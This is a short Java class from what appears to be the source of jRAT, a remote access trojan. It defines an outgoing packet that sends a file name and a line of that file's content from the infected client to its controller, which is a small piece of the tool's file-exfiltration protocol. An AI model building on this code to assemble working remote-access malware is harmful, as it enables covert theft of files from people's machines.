package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet42FilePreview extends AbstractOutgoingPacket {

	private String file;
	private String line;

	public Packet42FilePreview(String file, String line) {
		this.file = file;
		this.line = line;
	}

	@Override
	public void write(Connection dos) throws Exception {
		dos.writeLine(file);
		dos.writeLine(line);
	}

	@Override
	public short getPacketId() {
		return 42;
	}

}
